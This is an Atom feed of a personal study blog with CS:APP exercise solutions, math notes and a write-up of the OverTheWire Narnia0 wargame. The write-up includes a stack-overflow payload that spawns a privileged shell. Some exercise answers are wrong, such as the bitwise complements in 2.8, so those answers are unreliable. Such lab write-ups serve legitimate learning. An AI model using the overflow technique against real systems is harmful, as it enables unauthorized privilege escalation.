<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-17T20:33:16+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Journal</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Solution to Computer Systems: A Programmer’s Perspective</title><link href="http://localhost:4000/2024/04/13/solution-to-csapp.html" rel="alternate" type="text/html" title="Solution to Computer Systems: A Programmer’s Perspective" /><published>2024-04-13T00:00:00+09:00</published><updated>2024-04-13T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/13/solution-to-csapp</id><content type="html" xml:base="http://localhost:4000/2024/04/13/solution-to-csapp.html"><![CDATA[<h2 id="chapter-1">Chapter 1</h2>

<p>\[\begin{align}S = \frac{1}{(1-\alpha)+\alpha/k} &amp;&amp; \text{(Amdahl’s Law)} \end{align}\]</p>

<h1 id="practice-problem-11">Practice Problem 1.1</h1>

<p><img src="http://localhost:4000/assets/1.1.png" alt="1.1.png" /></p>

<p>A. It takes 25 hours to travel from Boise to Minneapolis and travelling through Montana takes 20 hours. Thus \(\alpha = \frac{\text{20hr}}{\text{25hr}} = 0.6\). The average speed improved from \(\text{100km/hr}\) to \(\text{150km/hr}\). Thus, \(k=\frac{\text{150km/hr}}{\text{100km/hr}}=1.5\). By Amdahl’s law, \(S=\frac{1}{(1-0.6 + 0.6/1.5)}=1.25\).</p>

<p>B. If we rearrange Amdhal’s law for \(k\), we get 
\[k=\frac{\alpha S}{1+S(\alpha-1)}\]</p>

<p>Let \(v\) represent the speed at which the vehicle travels through Montana. Then, \[\alpha = \frac{\text{1500km}/v + (\text{1000km}/ \text{100km/hr})}{\text{25hr}} \]. Given \(S = 1.67\), we have \[\frac{v}{100} = \frac{1.67(\frac{\text{10hr}\cdot v + \text{1500km}}{\text{25hr}\cdot v})} {1 + 1.67(\frac{\text{(10hr)}\cdot v + 1500km}{\text{25hr}\cdot v}-1)}\]. Thus, \(v=\text{305.56km/hr}\)</p>

<h1 id="practice-problem-12">Practice Problem 1.2</h1>

<p>Given \(\alpha=0.9\) and \(S=4\), we have to improve 90% of this machine by a factor of \(k=\frac{(0.9)(0.4)}{1+4\cdot (0.9-1)} = 6\)</p>

<h2 id="chapter-2">Chapter 2</h2>

<h1 id="practice-problem-21">Practice Problem 2.1</h1>
<p>A. \( (\text{0010 0101 1011 1001 1101 0010})_{2} \)</p>

<p>B. \( (\text{AE49})_{16}\)</p>

<p>C. \( (\text{1010 1000 1011 0011 1101})_2 \)</p>

<p>D. \( (\text{322D96})_{16} \)</p>

<h1 id="practice-problem-22">Practice Problem 2.2</h1>

<table>
  <thead>
    <tr>
      <th>\(n\)</th>
      <th>\(2^n\)(decimal)</th>
      <th>\(2^n\)(hexadecimal)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>5</td>
      <td>32</td>
      <td>0x20</td>
    </tr>
    <tr>
      <td>23</td>
      <td>8388608</td>
      <td>0x800000</td>
    </tr>
    <tr>
      <td>15</td>
      <td>32768</td>
      <td>0x8000</td>
    </tr>
    <tr>
      <td>13</td>
      <td>8192</td>
      <td>0x2000</td>
    </tr>
    <tr>
      <td>12</td>
      <td>4096</td>
      <td>0x1000</td>
    </tr>
    <tr>
      <td>6</td>
      <td>64</td>
      <td>0x40</td>
    </tr>
    <tr>
      <td>8</td>
      <td>256</td>
      <td>0x100</td>
    </tr>
  </tbody>
</table>

<h1 id="practice-problem-23">Practice Problem 2.3</h1>

<table>
  <thead>
    <tr>
      <th>Decimal</th>
      <th>Binary</th>
      <th>Hexadecimal</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td>0000 0000</td>
      <td>0x00</td>
    </tr>
    <tr>
      <td>158</td>
      <td>1001 1110</td>
      <td>0x9E</td>
    </tr>
    <tr>
      <td>76</td>
      <td>0100 1100</td>
      <td>0x4C</td>
    </tr>
    <tr>
      <td>145</td>
      <td>1001 0001</td>
      <td>0x91</td>
    </tr>
    <tr>
      <td>174</td>
      <td>1010 1110</td>
      <td>0xAE</td>
    </tr>
    <tr>
      <td>60</td>
      <td>0011 1100</td>
      <td>0x3C</td>
    </tr>
    <tr>
      <td>241</td>
      <td>1111 0001</td>
      <td>0xF1</td>
    </tr>
  </tbody>
</table>

<h1 id="practice-problem-24">Practice Problem 2.4</h1>
<p>A. 0x6061</p>

<p>B. 0x603C</p>

<p>C. 0x607c</p>

<p>D. 0x9c</p>

<h1 id="practice-problem-25">Practice Problem 2.5</h1>

<p>A. Little endian: 0x78      Big endian: 0x12
B. Little endian: 0x7856    Big endian: 0x1234
C. Little endian: 0x785634  Big endian: 0x123456</p>

<h1 id="practice-problem-26">Practice Problem 2.6</h1>

<p>A. \(\begin{align} \text{0x0027C8F8 = 0000 0000 0010 0111 1100 1000 1111 1000} \\ \text{0x4A1F23E0 = 0100 1010 0001 1111 0010 0011 1110 0000}\end{align}\)</p>

<p>B.
\(\begin{align}\text{0x0027c8f8 = 0000 0000 0010} \textbf{ 0111 1100 1000 1111 1000} \\ \text{0x4A1F23E0} \gg \text{2 = 0001 0010 1000} \textbf{ 0111 1100 1000 1111 1000} &amp;&amp; \text{(20 bits)}\end{align}\)<br />
C. See 2.6 B</p>

<h1 id="practice-problem-27">Practice Problem 2.7</h1>

<p>\(\text{0x7271706F6E6D}\)</p>

<h1 id="practice-problem-28">Practice Problem 2.8</h1>

<table>
  <thead>
    <tr>
      <th>Operation</th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>\(a\)</td>
      <td>\([01001110]\)</td>
    </tr>
    <tr>
      <td>\(b\)</td>
      <td>\([11100001]\)</td>
    </tr>
    <tr>
      <td>\(\sim a\)</td>
      <td>\([10010110]\)</td>
    </tr>
    <tr>
      <td>\(\sim b\)</td>
      <td>\([10101010]\)</td>
    </tr>
    <tr>
      <td>\(a\&amp; b\)</td>
      <td>\([01000001]\)</td>
    </tr>
    <tr>
      <td>\(a | b \)</td>
      <td>\([01111101]\)</td>
    </tr>
    <tr>
      <td>\(a^\widehat{} b\)</td>
      <td>\([00111100]\)</td>
    </tr>
  </tbody>
</table>

<h1 id="practice-problem-29">Practice Problem 2.9</h1>

<p>A.</p>

<table>
  <thead>
    <tr>
      <th>Colour</th>
      <th>Complement</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Black</td>
      <td>\(111\)</td>
    </tr>
    <tr>
      <td>Blue</td>
      <td>\(110\)</td>
    </tr>
    <tr>
      <td>Green</td>
      <td>\(101\)</td>
    </tr>
    <tr>
      <td>Cyan</td>
      <td>\(100\)</td>
    </tr>
    <tr>
      <td>Red</td>
      <td>\(011\)</td>
    </tr>
    <tr>
      <td>Magenta</td>
      <td>\(010\)</td>
    </tr>
    <tr>
      <td>Yellow</td>
      <td>\(001\)</td>
    </tr>
    <tr>
      <td>White</td>
      <td>\(000\)</td>
    </tr>
  </tbody>
</table>

<p>B.</p>

<p>\(\begin{align} \text{Blue} | \text{Green} &amp;= \text{Cyan} \\ \text{Yellow} \&amp; \text{Cyan} &amp;= \text{Blue} \\ \text{Red}^\widehat{} \text{Magenta} &amp;= \text{Blue} \end{align} \)</p>

<h1 id="practice-problem-210">Practice Problem 2.10</h1>

<table>
  <thead>
    <tr>
      <th>Step</th>
      <th>*x</th>
      <th>* y</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Initially</td>
      <td>a</td>
      <td>b</td>
    </tr>
    <tr>
      <td>Step 1</td>
      <td>a</td>
      <td>a^b</td>
    </tr>
    <tr>
      <td>Step 2</td>
      <td>a^a^b = b</td>
      <td>a^b</td>
    </tr>
    <tr>
      <td>Step 3</td>
      <td>b</td>
      <td>b^a^b = a</td>
    </tr>
  </tbody>
</table>

<h1 id="practice-problem-211">Practice Problem 2.11</h1>

<p>A. \(\lceil{\frac{2k+1}{2}}\rceil\)</p>

<p>B. a[first] and a[last] point to the same variable in the last iteration when cnt is odd. The function inplace_swap xor these two variables however since they point to the same number, the operation evaluates to zero.</p>

<p>C. <code class="language-plaintext highlighter-rouge">
    for (first = 0, last=cnt-1;
        first &lt; last;
        first++, last--)
   </code></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Chapter 1]]></summary></entry><entry><title type="html">Formula for Computer Systems</title><link href="http://localhost:4000/2024/04/12/formula.html" rel="alternate" type="text/html" title="Formula for Computer Systems" /><published>2024-04-12T00:00:00+09:00</published><updated>2024-04-12T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/12/formula</id><content type="html" xml:base="http://localhost:4000/2024/04/12/formula.html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

<p>For vector \(\vec{x} = [x_{w-1}, x_{w-2}, \ldots, x_0]\)
\[B2U_{w}(\vec{x}) \stackrel{.}= \sum_{i=0}^{w-1} x_i2^i\]
\[B2T_{w}(\vec{x}) \stackrel{.}= -x_{w-1}2^{w-1} + \sum_{i=0}^{w-2} x_i2^i\]
\[B2O_{w}(\vec{x}) \stackrel{.}= -x_{w-1}(2^{w-1} - 1) + \sum_{i=0}^{w-2} x_i2^i\]
\[B2S_{w}(\vec{x}) \stackrel{.}= (-1)^{x_{w-1}} \cdot \left(\sum_{i=0}^{w-2} x_i2^i \right)\]
\[U2T_{w}(u) = \begin{cases}u, &amp; u\leq \text{TMax}_w\\ u-2^w, &amp; u&gt;\text{TMax}_w\end{cases}\]</p>

<p>For \(x\) such that \(\text{TMin} \leq x \leq \text{TMax}\)
\[B2U_{w}(T2B_{w}(x)) = T2U_{w}(x) = x+x_{w-1}2^{w}\]</p>

<p>Truncation of an unsigned number
\[B2U_k([x_{k-1}, x_{k-2}, \ldots, x_{0}]) = B2U_w([x_{w-1}, x_{w-2}, \ldots, x_0])\mod 2^k\]
Truncation of a two’s-complement number
\[B2U_k([x_{k-1}, x_{k-2}, \ldots, x_{0}]) = U2T_k(B2U_w([x_{w-1}, x_{w-2}, \ldots, x_0])\mod 2^k)\]</p>]]></content><author><name></name></author><summary type="html"><![CDATA[For vector \(\vec{x} = [x_{w-1}, x_{w-2}, \ldots, x_0]\) \[B2U_{w}(\vec{x}) \stackrel{.}= \sum_{i=0}^{w-1} x_i2^i\] \[B2T_{w}(\vec{x}) \stackrel{.}= -x_{w-1}2^{w-1} + \sum_{i=0}^{w-2} x_i2^i\] \[B2O_{w}(\vec{x}) \stackrel{.}= -x_{w-1}(2^{w-1} - 1) + \sum_{i=0}^{w-2} x_i2^i\] \[B2S_{w}(\vec{x}) \stackrel{.}= (-1)^{x_{w-1}} \cdot \left(\sum_{i=0}^{w-2} x_i2^i \right)\] \[U2T_{w}(u) = \begin{cases}u, &amp; u\leq \text{TMax}_w\\ u-2^w, &amp; u&gt;\text{TMax}_w\end{cases}\]]]></summary></entry><entry><title type="html">Solution for Narnia0: OverTheWire</title><link href="http://localhost:4000/2024/04/02/narnia1.html" rel="alternate" type="text/html" title="Solution for Narnia0: OverTheWire" /><published>2024-04-02T00:00:00+09:00</published><updated>2024-04-02T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/02/narnia1</id><content type="html" xml:base="http://localhost:4000/2024/04/02/narnia1.html"><![CDATA[<h1 id="code">Code</h1>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">
</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="c1">
</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Here is your chance: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%24s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"val: 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">){</span>
        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"WAY OFF!!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<h1 id="behaviour-of-this-code">Behaviour of this code</h1>

<p>Initalize a variable of 4 bytes named <code class="language-plaintext highlighter-rouge">val</code> with value <code class="language-plaintext highlighter-rouge">0x41414141</code> and define a buffer of 20 bytes named <code class="language-plaintext highlighter-rouge">buf</code>.
Write 24 bytes to <code class="language-plaintext highlighter-rouge">buf</code>. If <code class="language-plaintext highlighter-rouge">val</code> has the value <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>, then escalate priviliege to that of <code class="language-plaintext highlighter-rouge">narnia1</code> and spawn a shell.
Otherwise exit the program with error.</p>

<h1 id="vulnerability">Vulnerability</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>** Key Information **
val:  4 bytes
buf: 20 bytes
scanf(): write 24 bytes into buf.
</code></pre></div></div>

<p>On line number <code class="language-plaintext highlighter-rouge">10</code>, the scanf function takes in 24 bytes into <code class="language-plaintext highlighter-rouge">buf</code>. However, <code class="language-plaintext highlighter-rouge">buf</code> is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, <code class="language-plaintext highlighter-rouge">val</code>.</p>

<h1 id="exploitation">Exploitation</h1>

<ol>
  <li>Fill <code class="language-plaintext highlighter-rouge">buf</code> with 20 bytes of characters.</li>
  <li>Fill the rest with <code class="language-plaintext highlighter-rouge">0xefbeadde</code>(Little Endian).</li>
</ol>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"%020x""</span><span class="se">\x</span><span class="s2">efbeadde"</span> | /narnia/narnia0 
</code></pre></div></div>

<p><strong>Result</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
val: 0xdeadbeef
</code></pre></div></div>

<p>We changed <code class="language-plaintext highlighter-rouge">val</code> to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use <code class="language-plaintext highlighter-rouge">cat</code> to do this.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span><span class="nb">printf</span> <span class="s2">"%020x</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de"</span><span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./narnia0
Correct val<span class="s1">'s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
val: 0xdeadbeef
whoami
narnia1
</span></code></pre></div></div>

<p>Done.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ long val=0x41414141; char buf[20]; printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n"); printf("Here is your chance: "); scanf("%24s",&amp;buf); printf("buf: %s\n",buf); printf("val: 0x%08x\n",val); if(val==0xdeadbeef){ setreuid(geteuid(),geteuid()); system("/bin/sh"); } else { printf("WAY OFF!!!!\n"); exit(1); } return 0; } Behaviour of this code Initalize a variable of 4 bytes named val with value 0x41414141 and define a buffer of 20 bytes named buf. Write 24 bytes to buf. If val has the value 0xdeadbeef, then escalate priviliege to that of narnia1 and spawn a shell. Otherwise exit the program with error. Vulnerability ** Key Information ** val: 4 bytes buf: 20 bytes scanf(): write 24 bytes into buf. On line number 10, the scanf function takes in 24 bytes into buf. However, buf is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, val. Exploitation Fill buf with 20 bytes of characters. Fill the rest with 0xefbeadde(Little Endian). $ printf "%020x""\xefbeadde" | /narnia/narnia0 Result: Correct val's value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef We changed val to 0xdeadbeef successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use cat to do this. $ (printf "%020x\xef\xbe\xad\xde"; cat) | ./narnia0 Correct val's value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef whoami narnia1 Done.]]></summary></entry><entry><title type="html">Floor, ceiling techinques</title><link href="http://localhost:4000/2022/11/20/floor-ceiling.html" rel="alternate" type="text/html" title="Floor, ceiling techinques" /><published>2022-11-20T00:00:00+09:00</published><updated>2022-11-20T00:00:00+09:00</updated><id>http://localhost:4000/2022/11/20/floor%20ceiling</id><content type="html" xml:base="http://localhost:4000/2022/11/20/floor-ceiling.html"><![CDATA[<ol>
  <li>Prove \( n = \lceil n/2 \rceil + \lfloor n/2 \rfloor \) where \(n\) is a nonnegative integer.</li>
</ol>

<p>We note that \(k = \lceil n/2 \rceil\) and \(m = \lfloor n/2 \rfloor\) are equivalent to \(k-1&lt; n/2 \leq k\) and \(m \leq n/2 &lt; m+1 \) respectively.
Since if \(a\leq b\) and \(c &lt; d \), then \(a+c &lt; b+d\), the inequalities show that \(k+m-1 &lt; n &lt; k+m+1\). There is only one integer in this interval: \(m+k = \lceil n/2 \rceil + \lfloor n/2 \rfloor = n\) since there are \(\lceil k+m+1 \rceil - \lfloor k+m-1 \rfloor - 1 = k+m\) many integers in the interval.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Prove \( n = \lceil n/2 \rceil + \lfloor n/2 \rfloor \) where \(n\) is a nonnegative integer.]]></summary></entry><entry><title type="html">Chapter 2 exercises</title><link href="http://localhost:4000/analysis/exercise/chp2" rel="alternate" type="text/html" title="Chapter 2 exercises" /><published>2022-11-19T00:00:00+09:00</published><updated>2022-11-19T00:00:00+09:00</updated><id>http://localhost:4000/analysis/exercise/analysis_exercise1</id><content type="html" xml:base="http://localhost:4000/analysis/exercise/chp2"><![CDATA[<p>Exercise 2.3.1: 
Prove Lemma 2.3.2</p>]]></content><author><name></name></author><category term="analysis" /><category term="exercise" /><summary type="html"><![CDATA[Exercise 2.3.1: Prove Lemma 2.3.2]]></summary></entry><entry><title type="html">Books to finish reading</title><link href="http://localhost:4000/2022/11/19/books-to-read.html" rel="alternate" type="text/html" title="Books to finish reading" /><published>2022-11-19T00:00:00+09:00</published><updated>2022-11-19T00:00:00+09:00</updated><id>http://localhost:4000/2022/11/19/books-to-read</id><content type="html" xml:base="http://localhost:4000/2022/11/19/books-to-read.html"><![CDATA[<p>Here are some books that any college student educated in computer science should have read and I should read.</p>
<ol>
  <li>Concrete Mathematics by Donald E. Knuth (16.5% Completed)</li>
  <li>The C++ Programing Language by Bjarne Strostrup ()</li>
</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Here are some books that any college student educated in computer science should have read and I should read. Concrete Mathematics by Donald E. Knuth (16.5% Completed) The C++ Programing Language by Bjarne Strostrup ()]]></summary></entry><entry><title type="html">Convention</title><link href="http://localhost:4000/convention/" rel="alternate" type="text/html" title="Convention" /><published>2022-11-18T00:00:00+09:00</published><updated>2022-11-18T00:00:00+09:00</updated><id>http://localhost:4000/convention</id><content type="html" xml:base="http://localhost:4000/convention/"><![CDATA[<h1 id="proofs-are-meant-to-be-concise">Proofs are meant to be concise</h1>
<p>Mathematical proofs are written in a way to efficiently deliver the idea and are not necessarily intended to explain the concepts.</p>

<h1 id="sufficient-explanations-for-ideas-are-given">Sufficient explanations for ideas are given</h1>
<p>Though proofs are written concisely, the ideas presented in the proofs are explained sufficiently in a way to help myself understand the concepts. This does not necessarily mean that readers will think and digest them in a similar way.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Proofs are meant to be concise Mathematical proofs are written in a way to efficiently deliver the idea and are not necessarily intended to explain the concepts.]]></summary></entry></feed>